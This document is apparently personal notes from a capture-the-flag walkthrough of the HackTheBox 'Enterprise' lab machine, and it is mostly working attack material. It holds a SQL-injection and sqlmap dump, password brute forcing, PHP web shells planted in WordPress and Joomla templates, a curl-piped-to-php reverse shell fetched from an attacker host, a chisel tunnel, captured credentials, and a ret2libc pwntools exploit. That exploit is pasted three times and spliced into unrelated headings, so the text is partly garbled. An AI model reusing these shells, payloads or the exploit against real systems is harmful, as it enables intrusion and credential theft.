# Enterprise

E = jeanlucpicard@enterprise.local
CN = enterprise.local

# information

Nmap 7.70 scan initiated Mon Mar 25 23:01:58 2019 as: nmap -sC -sV -oA nmap 10.10.10.61

```
Nmap scan report for 10.10.10.61
Host is up (0.27s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 7.4p1 Ubuntu 10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:e9:8c:c5:b5:52:23:f4:b8:ce:d1:96:4a:c0:fa:ac (RSA)
|   256 f3:9a:85:58:aa:d9:81:38:2d:ea:15:18:f7:8e:dd:42 (ECDSA)
|_  256 de:bf:11:6d:c0:27:e3:fc:1b:34:c0:4f:4f:6c:76:8b (ED25519)
80/tcp   open  http     Apache httpd 2.4.10 ((Debian))
|_http-generator: WordPress 4.8.1
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: USS Enterprise &#8211; Ships Log
443/tcp  open  ssl/http Apache httpd 2.4.25 ((Ubuntu))
|_http-server-header: Apache/2.4.25 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
| ssl-cert: Subject: commonName=enterprise.local/organizationName=USS Enterprise/stateOrProvinceName=United Federation of Planets/countryName=UK
| Not valid before: 2017-08-25T10:35:14
|_Not valid after:  2017-09-24T10:35:14
|_ssl-date: TLS randomness does not represent time
|
8080/tcp open  http     Apache httpd 2.4.10 ((Debian))
|_http-generator: Joomla! - Open Source Content Management
|_http-open-proxy: Proxy might be redirecting requests
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Nmap done at Mon Mar 25 23:03:46 2019 -- 1 IP address (1 host up) scanned in 107.85 seconds
```

##   apache 

 Apache/2.4.10 

Apache httpd 2.4.25 

Apache httpd 2.4.10

##  Enum 443 port

```bash
 gobuster -k  -w /usr/share/wordlists/dirbuster/
directory-list-lowercase-2.3-medium.txt  -u https://enterprise.htb

=====================================================

# Gobuster v2.0.1              OJ Reeves (@TheColonial)

[+] Mode         : dir
[+] Url/Domain   : https://enterprise.htb/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Status codes : 200,204,301,302,307,403

# [+] Timeout      : 10s

# 2019/03/26 17:09:36 Starting gobuster

/files (Status: 301)
```



# Index of /files

| ![[ICO]](https://10.10.10.61/icons/blank.gif)      | [Name](https://10.10.10.61/files/?C=N;O=D)       | [Last modified](https://10.10.10.61/files/?C=M;O=A) | [Size](https://10.10.10.61/files/?C=S;O=A) | [Description](https://10.10.10.61/files/?C=D;O=A) |
| -------------------------------------------------- | ------------------------------------------------ | --------------------------------------------------- | ------------------------------------------ | ------------------------------------------------- |
|                                                    |                                                  |                                                     |                                            |                                                   |
| ![[PARENTDIR]](https://10.10.10.61/icons/back.gif) | [Parent Directory](https://10.10.10.61/)         |                                                     | -                                          |                                                   |
| ![[   ]](https://10.10.10.61/icons/compressed.gif) | [lcars.zip](https://10.10.10.61/files/lcars.zip) | 2017-10-17 21:46                                    | 1.4K                                       |                                                   |

### lcars plugin  sql injection

```php
if (isset($_GET['query'])){
    $query = $_GET['query'];
    $sql = "SELECT ID FROM wp_posts WHERE post_name = $query";
    $result = $db->query($sql);
    echo $result
```

http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1%20union%20select%201

**Catchable fatal error**:  Object of class mysqli_result could not be converted to string in **/var/www/html/wp-content/plugins/lcars/lcars_db.php** on line **16**

# Dump all tables

```bash
sqlmap -u http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1 --dbms mysql  --dump
```

### capture  the passwd

```bash
cat  /root/.sqlmap/output/enterprise.htb/dump/wordpress/* | less
ZxJyhGem4k338S2Y
ZD3YxfnSjezg67JZ
u*Z14ru0p#ttj83zS6


```

# burp the wordpress

```bash
wpscan --url http://enterprise.htb  -U user  -P cred

[i] Valid Combinations Found:
 | Username: william.riker, Password: u*Z14ru0p#ttj83zS6
```

#  Revershell  in wordpressfrom pwn import *

host = "10.10.10.61"
port =  "32812"
context(os="linux", arch="i386")
padding = "\x90" * 212

system = p32(0xf7e4c060)
exit = p32(0xf7e3faf0 )
sh_addr =p32(0xf7f6ddd5)

r2libc= system + exit+ sh_addr

payload =  padding + r2libc

sh =  remote(host, port)
sh.recvuntil("Enter Bridge Access Code")
sh.sendline("picarda1")
sh.recvuntil("Waiting for input:")
sh.sendline("4")
sh.recvuntil("Enter Security Override:")
#print s.recv(1024)
sh.sendline(payload)
sh.interactive()



http://enterprise.htb/wp-admin/theme-editor.php?file=404.php&theme=twentyseventeen

http://enterprise.htb/wp-admin/theme-editor.php?file=inc%2Fcustom-header.php&theme=twentyseventeen

```php
<?php
/**

- Custom header implementation
  *
- @link https://codex.wordpress.org/Custom_Headers
  *
- @package WordPress
- @subpackage Twenty_Seventeen
- @since 1.0
  */

if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}
[snip......]
```

http://enterprise.htb/?cmd=which%20php

```
from pwn import *

host = "10.10.10.61"
port =  "32812"
context(os="linux", arch="i386")
padding = "\x90" * 212

system = p32(0xf7e4c060)
exit = p32(0xf7e3faf0 )
sh_addr =p32(0xf7f6ddd5)

r2libc= system + exit+ sh_addr

payload =  padding + r2libc

sh =  remote(host, port)
sh.recvuntil("Enter Bridge Access Code")
sh.sendline("picarda1")
sh.recvuntil("Waiting for input:")
sh.sendline("4")
sh.recvuntil("Enter Security Override:")
#print s.recv(1024)
sh.sendline(payload)
sh.interactive()/usr/local/bin/php
```

revershell:

http://enterprise.htb/?cmd=curl%20http://10.10.14.27/rv.php%20|%20php

```bash
nc -lvnp  9000
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::9000
Ncat: Listening on 0.0.0.0:9000
Ncat: Connection from 10.10.10.61.
Ncat: Connection from 10.10.10.61:60734.
Linux b8319d86d21e 4.10.0-37-generic #41-Ubuntu SMP Fri Oct 6 20:20:37 UTC 2017 x86_64 GNU/Linux
 01:34:06 up 2 days,  2:50,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ which python
$ which python3
```

# Reverse Tunnle for mysql

```bash
cat wp-config.php | grep -i "db\|pass"
define('DB_NAME', 'wordpress');
define('DB_USER', 'root');
/** MySQL database password */
define('DB_PASSWORD', 'NCC-1701E');
define('DB_HOST', 'mysql');
define('DB_CHARSET', 'utf8');
define('DB_COLLATE', '');
```

```bash
8001->172.17.0.2:3306

./chisel  server --port 8000 -v  --reverse

./chisel client 10.10.14.27:8000 R:8001:172.17.0.2:3306 &
```

```bash
mysql -u root -h 127.0.0.1 -P 8001 -p
```

```mysql
MySQL [joomladb]> describe edz2g_users;
+---------------+---------------+------+-----+---------------------+----------------+
| Field         | Type          | Null | Key | Default             | Extra          |
+---------------+---------------+------+-----+---------------------+----------------+
| id            | int(11)       | NO   | PRI | NULL                | auto_increment |
| name          | varchar(400)  | NO   | MUL |                     |                |
| username      | varchar(150)  | NO   | MUL |                     |                |
| email         | varchar(100)  | NO   | MUL |                     |                |
| password      | varchar(100)  | NO   |     |                     |                |
```

# Revershel  in jooma

```mysql
 select id,username,password from edz2g_users;
+-----+-----------------+--------------------------------------------------------------+
| id  | username        | password                                                     |
+-----+-----------------+--------------------------------------------------------------+
| 400 | geordi.la.forge | $2y$10$cXSgEkNQGBBUneDKXq9gU.8RAf37GyN7JIrPE7us9UBMR9uDDKaWy |
| 401 | Guinan          | $2y$10$90gyQVv7oL6CCN8lF/0LYulrjKRExceg2i0147/Ewpb6tBzHaqL2q |
```

 guess password in `befault passwd`

```
ZxJyhGem4k338S2Y
ZD3YxfnSjezg67JZ
u*Z14ru0p#ttj83zS6
```

edit in : http://10.10.10.61:8080/administrator/index.php?option=com_templates&view=template&id=506&file=L2luZGV4LnBocA%3D%3D  template index.php

```php
if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}
[snip......]
```

#  files writeable in joomla

**/dev/mapper/enterprise--vg-root on /var/www/html/files type ext4 (rw,relatime,errors=remount-ro,data=ordered)**

```bash
$ cd files
$ ls
lcars.zip
$ curl http://10.10.14.27/rv-9002.php  -o rv-9002.php
```

#  lcars in /bin/

```
ls -al /bin/lcars
-rwsr-xr-x 1 root root 12152 Sep  8  2017 /bin/lcars

State      Recv-Q Send-Q Local Address:Port               Peer Address:Port
LISTEN     0      128          *:5355                     *:*
LISTEN     0      64           *:32812                    *:*
```



#  Return lib c 

```bash
gdb -q  /lib32/libc.so.6
p system
$1 = {<text variable, no debug info>} 0x3e980 <system>
system =256384 
```

```bash
ps -ef | grep lcars

root      7970 17272  0 20:53 pts/4    00:00:00 ./lcar

56555000-56557000 r-xp 00000000 08:05 922714                             /root/htb/Enterprise/bin/lcars
56557000-56558000 r-xp 00001000 08:05 922714                             /root/htb/Enterprise/bin/lcars
56558000-56559000 rwxp 057652520002000 08:05 922714                             /root/htb/Enterprise/bin/lcars
56559000-5657b000 rwxp 00000000 00:00 0                                  [heap]
f7dcf000-f7de8000 r-xp 00000000 08:05 2097342                            /usr/lib32/libc-2.28.so

root@ens:~/htb/Enterprise/bin# strings -a    -o   /usr/lib32/libc-2.28.so | grep /bin/sh
5765252 /bin/sh
```

system =  0x3e980

libc = f7dcf000

/bin/sh = 5765252

# Payload

```python
from pwn import *

host = "10.10.10.61"
port =  "32812"
context(os="linux", arch="i386")
padding = "\x90" * 212

system = p32(0xf7e4c060)
exit = p32(0xf7e3faf0 )
sh_addr =p32(0xf7f6ddd5)

r2libc= system + exit+ sh_addr

payload =  padding + r2libc

sh =  remote(host, port)
sh.recvuntil("Enter Bridge Access Code")
sh.sendline("picarda1")
sh.recvuntil("Waiting for input:")
sh.sendline("4")
sh.recvuntil("Enter Security Override:")
#print s.recv(1024)
sh.sendline(payload)
sh.interactive()
```

